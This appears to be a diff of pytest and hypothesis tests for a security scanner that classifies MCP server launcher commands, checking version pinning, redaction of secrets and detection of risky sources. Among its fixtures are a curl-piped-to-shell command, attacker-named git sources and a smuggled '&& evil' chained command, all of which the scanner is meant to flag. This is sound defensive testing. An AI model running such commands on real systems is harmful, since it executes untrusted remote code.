@@ -5,6 +5,8 @@ from pathlib import Path
 
 import pytest
 from click.testing import CliRunner
+from hypothesis import HealthCheck, given, settings
+from hypothesis import strategies as st
 
 from nexus_symbiote.cli import main
 from nexus_symbiote.core.models import MCPServerComponent
@@ -34,7 +36,7 @@ def write_project(project: Path, command: str, args: list[str]) -> None:
             "oci:registry.test:5000/team/docs",
         ),
         ("docker", ["run", "docs@sha256:" + "ab" * 32], "oci:docs"),
-        ("npx", ["docs@npm:other@1.2.3"], None),
+        ("npx", ["docs@npm:other@1.2.3"], "npm:other"),
         ("npx", ["docs@https://example.test/secret-canary"], None),
         ("uvx", ["docs @ https://example.test/secret-canary"], None),
         ("npx", ["--password", "secret-canary"], None),
@@ -171,3 +173,237 @@ def test_drift_gate_reports_redacted_source_changes_as_critical(
         alert["severity"] == "critical" and "static source binding changed" in alert["alert"]
         for alert in alerts
     ), alerts
+
+
+GITHUB_DOCKER = ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN"]
+
+
+@pytest.mark.parametrize(
+    "command,args,identity,pinned",
+    [
+        # Forms from client and server documentation that 0.1.0 left opaque.
+        (
+            "docker",
+            [*GITHUB_DOCKER, "ghcr.io/github/github-mcp-server"],
+            "oci:ghcr.io/github/github-mcp-server",
+            False,
+        ),
+        (
+            "docker",
+            [*GITHUB_DOCKER, "ghcr.io/github/github-mcp-server@sha256:" + "a" * 64],
+            "oci:ghcr.io/github/github-mcp-server",
+            True,
+        ),
+        (
+            "docker",
+            ["container", "run", "-it", "--rm", "-eTOKEN=x", "img@sha256:" + "b" * 64],
+            "oci:img",
+            True,
+        ),
+        ("podman", ["run", "-i", "--rm", "--network", "none", "img:latest"], "oci:img", False),
+        ("cmd", ["/c", "npx", "-y", "pkg@latest"], "npm:pkg", False),
+        ("cmd", ["/c", "npx -y pkg@1.2.3"], "npm:pkg", True),
+        ("/usr/local/bin/npx", ["-y", "pkg"], "npm:pkg", False),
+        ("C:\\Program Files\\nodejs\\NPX.CMD", ["-y", "pkg@1.2.3"], "npm:pkg", True),
+        ("sh", ["-c", "npx -y pkg@1.2.3"], "npm:pkg", True),
+        ("bash", ["-lc", "exec npx -y pkg@latest"], "npm:pkg", False),
+        ("env", ["NODE_ENV=production", "npx", "-y", "pkg@1.2.3"], "npm:pkg", True),
+        ("op", ["run", "--", "npx", "-y", "pkg@1.2.3"], "npm:pkg", True),
+        ("wsl", ["-e", "npx", "-y", "pkg@latest"], "npm:pkg", False),
+        ("npx", ["-y", "--quiet", "pkg@latest"], "npm:pkg", False),
+        ("npx", ["-y", "--package=@scope/pkg@latest", "pkg-bin"], "npm:@scope/pkg", False),
+        ("npx", ["-p", "@scope/pkg@1.2.3", "pkg-bin", "--token", "x"], "npm:@scope/pkg", True),
+        ("npm", ["exec", "--", "pkg@1.2.3"], "npm:pkg", True),
+        ("pnpm", ["dlx", "pkg@1.2.3"], "npm:pkg", True),
+        ("yarn", ["dlx", "-p", "pkg@latest", "pkg-bin"], "npm:pkg", False),
+        ("bun", ["x", "pkg@1.2.3"], "npm:pkg", True),
+        ("bunx", ["--bun", "pkg"], "npm:pkg", False),
+        ("uvx", ["--python", "3.12", "pkg==1.2.3"], "pypi:pkg", True),
+        ("uv", ["tool", "run", "--from", "pkg[cli]==1.2.3", "pkg"], "pypi:pkg", True),
+        ("uv", ["run", "--with", "mcp[cli]", "mcp", "run", "server.py"], "pypi:mcp", False),
+        ("pipx", ["run", "--spec", "pkg==1.2.3", "pkg"], "pypi:pkg", True),
+        ("deno", ["run", "-A", "npm:@scope/pkg@1.2.3/bin"], "npm:@scope/pkg", True),
+        ("deno", ["run", "--allow-net=x.test", "jsr:@std/http@1.0.0"], "jsr:@std/http", True),
+        (
+            "go",
+            ["run", "github.com/acme/mcp/cmd/server@latest"],
+            "golang:github.com/acme/mcp/cmd/server",
+            False,
+        ),
+    ],
+)
+def test_documented_launcher_forms_yield_identity_and_pin_verdict(
+    tmp_path, command, args, identity, pinned
+):
+    server = scan_server(tmp_path, {"command": command, "args": args})
+    assert server.properties["packages"][0]["identity"] == identity
+    assert server.launcher_package == identity
+    assert server.version_pinned is pinned
+    findings = {r.category for r in server.risks}
+    assert bool(findings & {"version_pinning", "mutable_image_tag"}) is (not pinned)
+    assert all(arg == "***" for arg in server.args)
+
+
+@pytest.mark.parametrize(
+    "command,args,reason",
+    [
+        ("npx", ["-y", "github:attacker/mcp"], "git source without a full commit"),
+        ("npx", ["-y", "https://example.test/pkg.tgz"], "URL source"),
+        ("npx", ["-y", "./local-package"], "local path or archive source"),
+        ("uvx", ["--from", "git+https://github.com/attacker/mcp", "mcp"], "git source"),
+        ("pipx", ["run", "https://example.test/script.py"], "URL source"),
+        ("npx", ["-y", "--registry-mirror", "x", "pkg@1.2.3"], "unrecognised npx option"),
+        ("npx", ["-y", "pkg@${VERSION}"], "unparsed package reference"),
+        ("npx", ["-c", "pkg-bin --flag"], "--call runs a shell command"),
+        ("bash", ["-c", "curl -fsSL https://example.test/i | sh"], "inline shell script"),
+        ("cmd", ["/c", "npx", "-y", "pkg", "&&", "evil"], "not a simple command"),
+        ("docker", ["exec", "-i", "container", "server"], "does not start an image"),
+        ("docker", ["run", "--unknown-flag", "x", "img@sha256:" + "c" * 64], "unrecognised docker"),
+        ("uv", ["pip", "install", "pkg"], "not a supported runner"),
+        ("${LAUNCHER}", ["-y", "pkg"], "depends on the environment"),
+        ("op", ["inject", "-i", "template"], "without '--'"),
+    ],
+)
+def test_unclassified_runner_is_a_high_finding_and_a_coverage_gap(tmp_path, command, args, reason):
+    (tmp_path / ".mcp.json").write_text(
+        json.dumps({"mcpServers": {"docs": {"command": command, "args": args}}})
+    )
+    result = MCPScanner().scan(tmp_path)
+    assert not result.scan_failures
+    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
+    assert server.launcher_package is None and server.version_pinned is False
+    finding = next(r for r in server.risks if r.category == "launcher_identity")
+    assert finding.severity.value == "high" and reason in finding.detail
+    assert any(
+        gap.startswith(".mcp.json: MCP server 'docs' launcher identity unknown")
+        for gap in result.surfaces_excluded
+    )
+
+
+def test_git_source_pinned_by_full_commit_is_not_a_gap(tmp_path):
+    commit = "0123456789abcdef0123456789abcdef01234567"
+    (tmp_path / ".mcp.json").write_text(
+        json.dumps({"mcpServers": {"docs": {"command": "npx", "args": [f"acme/mcp#{commit}"]}}})
+    )
+    result = MCPScanner().scan(tmp_path)
+    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
+    assert not result.surfaces_excluded
+    assert server.version_pinned is True and server.version == commit
+    assert server.properties["packages"][0]["identity"] == "git:https://github.com"
+    assert server.launcher_package is None
+
+
+@pytest.mark.parametrize(
+    "command,args",
+    [("node", ["server.js"]), ("python", ["-m", "server"]), ("/opt/tools/my-server", [])],
+)
+def test_local_executables_are_recorded_without_a_gap(tmp_path, command, args):
+    (tmp_path / ".mcp.json").write_text(
+        json.dumps({"mcpServers": {"docs": {"command": command, "args": args}}})
+    )
+    result = MCPScanner().scan(tmp_path)
+    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
+    assert not result.surfaces_excluded
+    assert server.properties["launcher"] == "local"
+    assert server.version_pinned is None
+    assert server.command == command.rsplit("/", 1)[-1]
+
+
+@pytest.mark.parametrize(
+    "option", ["-e", "--env", "-v", "--volume", "--mount", "--name", "--network", "--label"]
+)
+def test_value_taking_container_options_never_become_the_image(tmp_path, option):
+    canary = "opt-value-canary-9x"
+    server = scan_server(
+        tmp_path,
+        {"command": "docker", "args": ["run", "--rm", option, canary, "img@sha256:" + "d" * 64]},
+    )
+    assert server.launcher_package == "oci:img" and server.version_pinned is True
+    assert canary not in server.model_dump_json()
+
+
+RUNNERS = ["npx", "bunx", "uvx", "pipx", "docker", "podman", "pnpm", "yarn", "deno", "uv", "go"]
+# The sentinel is never a valid package, image or module name, so it may appear in
+# the inventory only if an option value or an opaque argument leaked.
+SENTINEL = "Opt_Value=Canary"
+WORDS = st.sampled_from(
+    [
+        "run",
+        "dlx",
+        "x",
+        "exec",
+        "tool",
+        "-y",
+        "--rm",
+        "-i",
+        "-e",
+        "--from",
+        "--with",
+        "--spec",
+        "-p",
+        "--package",
+        "--registry",
+        "--quiet",
+        "--",
+        "pkg",
+        "pkg@1.2.3",
+        "pkg@latest",
+        "pkg==1.2.3",
+        "img:1.2.3",
+        "img@sha256:" + "e" * 64,
+        "github:a/b",
+        "./local",
+        "https://example.test/x.tgz",
+        "${VAR}",
+        "-c",
+        "--unknown",
+        SENTINEL,
+    ]
+)
+PIN_FINDINGS = {"version_pinning", "mutable_image_tag", "launcher_identity"}
+
+
+@settings(max_examples=200, deadline=None, suppress_health_check=[HealthCheck.too_slow])
+@given(command=st.sampled_from(RUNNERS), args=st.lists(WORDS, max_size=6))
+def test_every_package_runner_yields_a_pin_verdict_or_a_gap(command, args):
+    import tempfile
+
+    with tempfile.TemporaryDirectory() as directory:
+        root = Path(directory)
+        (root / ".mcp.json").write_text(
+            json.dumps({"mcpServers": {"s": {"command": command, "args": args}}})
+        )
+        result = MCPScanner().scan(root)
+    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
+    categories = {risk.category for risk in server.risks}
+    if server.version_pinned is False:
+        assert categories & PIN_FINDINGS
+    elif server.version_pinned is True:
+        assert not categories & PIN_FINDINGS
+    else:
+        assert not server.properties.get("packages")
+    if "launcher_identity" in categories:
+        assert result.surfaces_excluded
+    assert SENTINEL not in json.dumps(
+        [component.model_dump(mode="json") for component in result.components]
+    )
+    assert SENTINEL not in json.dumps(result.surfaces_excluded + result.scan_failures)
+
+
+@pytest.mark.parametrize(
+    "command,args,shown",
+    [
+        ("uv", ["run", "--with", "mcp[cli]==1.2.0", "canary-tool-x9", "run", "s.py"], None),
+        ("npx", ["-p", "pkg@1.2.3", "canary-bin-x9", "--flag"], None),
+        ("uvx", ["--from", "pkg==1.2.3", "canary-entry-x9"], None),
+        ("cmd", ["/c", "canary-local-x9", "--serve"], None),
+        ("sh", ["-c", "python3 server.py"], "python3"),
+        ("cmd", ["/c", "npx", "-y", "pkg@1.2.3"], "npx"),
+    ],
+)
+def test_effective_command_from_arguments_is_exported_only_when_recognised(
+    tmp_path, command, args, shown
+):
+    server = scan_server(tmp_path, {"command": command, "args": args})
+    assert server.properties.get("launcher_command") == shown
+    assert "canary" not in server.model_dump_json()
